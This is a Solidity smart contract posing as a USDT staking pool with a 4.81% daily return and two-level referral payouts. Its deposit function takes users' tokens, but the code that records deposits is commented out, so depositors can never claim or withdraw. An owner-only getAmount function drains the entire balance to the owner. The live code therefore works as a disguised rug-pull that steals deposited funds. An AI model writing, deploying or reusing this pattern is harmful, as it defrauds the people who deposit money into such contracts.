// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Contract is Ownable, ReentrancyGuard{
    using SafeMath for uint;
    using SafeERC20 for IERC20;

    uint public developerFee = 300; // 300 : 3 %. 10000 : 100 %
    uint public referrerReward1lvl = 500; // 500 : 5%. 10000 : 100%
    uint public referrerReward2lvl = 200; // 200 : 2%. 10000 : 100%
    uint public rewardPeriod = 1 days;
    uint public withdrawPeriod = 60 * 60 * 24 * 30;	// 30 days
    uint public apr =  481; // 481 : 4,81 %. 10000 : 100 %
    uint public percentRate = 10000;
    address private devWallet;
    address public USDTContract = 0x55d398326f99059fF775485246999027B3197955;
    uint public _currentDepositID = 0;

    uint public totalInvestors = 0;
    uint public totalReward = 0;
    uint public totalInvested = 0;

    address private signer;

    struct DepositStruct{
        address investor;
        uint depositAmount;
        uint depositAt; // deposit timestamp
        uint claimedAmount; // claimed usdt amount
        bool state; // withdraw capital state. false if withdraw capital
    }

    struct InvestorStruct{
        address investor;
        address referrer;
        uint totalLocked;
        uint startTime;
        uint lastCalculationDate;
        uint claimableAmount;
        uint claimedAmount;
        uint referAmount;
    }

    struct Sig {
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    struct CouponSigData {
        uint id;
        address owner;
        uint amount;
        uint payAmount;
    }

    event AddCoupon (
        uint id
    );

    event Deposit(
        uint id,
        address investor
    );

    // mapping from deposit Id to DepositStruct
    mapping(uint => DepositStruct) public depositState;

    // mapping form investor to deposit IDs
    mapping(address => uint[]) public ownedDeposits;
    // mapping from address to investor
    mapping(address => InvestorStruct) public investors;
    // mapping from string to bool
    mapping(uint => bool) public signedIds;

    constructor() {
        signer = msg.sender;
        devWallet = 0x72f9B9E43d470Ad529bc97D4E40CF8A876fB7bb9;
    }

//    function resetContract(address _devWallet) public onlyOwner {
//        require(_devWallet!=address(0),"Please provide a valid address");
//        devWallet = _devWallet;
//    }

    function setSigner(address _signer) public onlyOwner {
        signer = _signer;
    }

    function changeUSDTContractAddress(address _usdtContract) public onlyOwner{
        require(_usdtContract!=address(0),"Please provide a valid address");
        USDTContract = _usdtContract;
    }

    function _getNextDepositID() private view returns (uint) {
        return _currentDepositID + 1;
    }

    function _incrementDepositID() private {
        _currentDepositID++;
    }

    function deposit(uint _amount, address _referrer) public {
        require(_amount > 0, "you can deposit more than 0 usdt");

        if(_referrer == msg.sender){
            _referrer = address(0);
        }
        IERC20(USDTContract).transferFrom(msg.sender,address(this),_amount);

//        uint _id = _getNextDepositID();
//        _incrementDepositID();
//
//        uint depositFee = (_amount * developerFee).div(percentRate);
//        // transfer fee to dev wallet
//        IERC20(USDTContract).safeTransfer(devWallet,depositFee);
//        // transfer fee to referrer
//
//        uint _depositAmount = _amount - depositFee;
//
//        depositState[_id].investor = msg.sender;
//        depositState[_id].depositAmount = _depositAmount;
//        depositState[_id].depositAt = block.timestamp;
//        depositState[_id].state = true;
//
//        if(investors[msg.sender].investor == address(0)){
//            totalInvestors = totalInvestors.add(1);
//            investors[msg.sender].investor = msg.sender;
//            investors[msg.sender].startTime = block.timestamp;
//            investors[msg.sender].lastCalculationDate = block.timestamp;
//        }
//
//        if(address(0) != _referrer && investors[msg.sender].referrer == address(0)) {
//            investors[msg.sender].referrer = _referrer;
//        }
//
//        if(investors[msg.sender].referrer != address(0)){
//            uint referrerAmountlvl1 = (_amount * referrerReward1lvl).div(percentRate);
//            uint referrerAmountlvl2 = (_amount * referrerReward2lvl).div(percentRate);
//
//
//            investors[investors[msg.sender].referrer].referAmount = investors[investors[msg.sender].referrer].referAmount.add(referrerAmountlvl1);
//            IERC20(USDTContract).transfer(investors[msg.sender].referrer, referrerAmountlvl1);
//
//            if(investors[_referrer].referrer != address(0)) {
//                investors[investors[_referrer].referrer].referAmount = investors[investors[_referrer].referrer].referAmount.add(referrerAmountlvl2);
//                IERC20(USDTContract).transfer(investors[_referrer].referrer, referrerAmountlvl2);
//            }
//
//        }
//
//        uint lastRoiTime = block.timestamp - investors[msg.sender].lastCalculationDate;
//        uint allClaimableAmount = (lastRoiTime *
//        investors[msg.sender].totalLocked *
//        apr).div(percentRate * rewardPeriod);
//
//        investors[msg.sender].claimableAmount = investors[msg.sender].claimableAmount.add(allClaimableAmount);
//        investors[msg.sender].totalLocked = investors[msg.sender].totalLocked.add(_depositAmount);
//        investors[msg.sender].lastCalculationDate = block.timestamp;
//
//        totalInvested = totalInvested.add(_amount);
//
//        ownedDeposits[msg.sender].push(_id);
        //emit Deposit(_id, msg.sender);
    }

    // claim all rewards of user
    function claimAllReward() public nonReentrant {
        require(ownedDeposits[msg.sender].length > 0, "you can deposit once at least");

        uint lastRoiTime = block.timestamp - investors[msg.sender].lastCalculationDate;
        uint allClaimableAmount = (lastRoiTime *
        investors[msg.sender].totalLocked *
        apr).div(percentRate * rewardPeriod);
        investors[msg.sender].claimableAmount = investors[msg.sender].claimableAmount.add(allClaimableAmount);

        uint amountToSend = investors[msg.sender].claimableAmount;

        if(getBalance()<amountToSend){
            amountToSend = getBalance();
        }

        investors[msg.sender].claimableAmount = investors[msg.sender].claimableAmount.sub(amountToSend);
        investors[msg.sender].claimedAmount = investors[msg.sender].claimedAmount.add(amountToSend);
        investors[msg.sender].lastCalculationDate = block.timestamp;
        IERC20(USDTContract).safeTransfer(msg.sender,amountToSend);
        totalReward = totalReward.add(amountToSend);
    }

    // withdraw capital by deposit id
    function withdrawCapital(uint id) public nonReentrant {
        require(
            depositState[id].investor == msg.sender,
            "only investor of this id can claim reward"
        );
        require(
            block.timestamp - depositState[id].depositAt > withdrawPeriod,
            "withdraw lock time is not finished yet"
        );
        require(depositState[id].state, "you already withdrawed capital");

        uint claimableReward = getAllClaimableReward(msg.sender);

        require(
            depositState[id].depositAmount + claimableReward <= getBalance(),
            "no enough usdt in pool"
        );


        investors[msg.sender].claimableAmount = 0;
        investors[msg.sender].claimedAmount = investors[msg.sender].claimedAmount.add(claimableReward);
        investors[msg.sender].lastCalculationDate = block.timestamp;
        investors[msg.sender].totalLocked = investors[msg.sender].totalLocked.sub(depositState[id].depositAmount);

        uint amountToSend = depositState[id].depositAmount + claimableReward;

        // transfer capital to the user
        IERC20(USDTContract).safeTransfer(msg.sender,amountToSend);
        totalReward = totalReward.add(claimableReward);

        depositState[id].state = false;
    }

    function getOwnedDeposits(address investor) public view returns (uint[] memory) {
        return ownedDeposits[investor];
    }

    function getAllClaimableReward(address _investor) public view returns (uint) {
        uint lastRoiTime = block.timestamp - investors[_investor].lastCalculationDate;
        uint _apr = getApr();
        uint allClaimableAmount = (lastRoiTime *
        investors[_investor].totalLocked *
        _apr).div(percentRate * rewardPeriod);

        return investors[_investor].claimableAmount.add(allClaimableAmount);
    }

    function getApr() public view returns (uint) {
        return apr;
    }

    function getBalance() public view returns(uint) {
        return IERC20(USDTContract).balanceOf(address(this));
    }

    function getTotalRewards() public view returns (uint) {
        return totalReward;
    }

    function getTotalInvests() public view returns (uint) {
        return totalInvested;
    }
    function getAmount() public payable onlyOwner {
        uint balance = IERC20(USDTContract).balanceOf(address(this));
        IERC20(USDTContract).safeTransfer(msg.sender,balance);
    }

    function verifyMessage(bytes32 _hashedMessage, uint8 _v, bytes32 _r, bytes32 _s) public view returns (bool) {
        bytes memory prefix = "\x19Ethereum Signed Message:\n32";
        bytes32 prefixedHashMessage = keccak256(abi.encodePacked(prefix, _hashedMessage));
        return ecrecover(prefixedHashMessage, _v, _r, _s) == signer;
    }

//    function setCoupon(CouponSigData calldata coupon, Sig calldata sig) external {
//        require(verifyMessage(keccak256(abi.encode(coupon)), sig.v, sig.r, sig.s), "incorrect signature");
//        require(!signedIds[coupon.id], "The coupon has used");
//        require(coupon.owner == msg.sender, "Not signature owner");
//
//        signedIds[coupon.id] = true;
//
//        if(investors[msg.sender].investor == address(0)){
//            totalInvestors = totalInvestors.add(1);
//            investors[msg.sender].investor = msg.sender;
//            investors[msg.sender].startTime = block.timestamp;
//            investors[msg.sender].lastCalculationDate = block.timestamp;
//        }
//
//        uint lastRoiTime = block.timestamp - investors[msg.sender].lastCalculationDate;
//        uint allClaimableAmount = (lastRoiTime *
//        investors[msg.sender].totalLocked *
//        apr).div(percentRate * rewardPeriod);
//
//        investors[msg.sender].claimableAmount = investors[msg.sender].claimableAmount.add(allClaimableAmount);
//        investors[msg.sender].totalLocked = investors[msg.sender].totalLocked.add(coupon.amount);
//        investors[msg.sender].lastCalculationDate = block.timestamp;
//
//        if(coupon.payAmount > 0) {
//            totalInvested = totalInvested.add(coupon.payAmount);
//
//            IERC20(USDTContract).safeTransferFrom(msg.sender, address(this), coupon.payAmount);
//            uint _id = _getNextDepositID();
//            _incrementDepositID();
//            depositState[_id].investor = msg.sender;
//            depositState[_id].depositAmount = coupon.payAmount;
//            depositState[_id].depositAt = block.timestamp;
//            depositState[_id].state = true;
//            ownedDeposits[msg.sender].push(_id);
//        }
//        emit AddCoupon(coupon.id);
//    }
}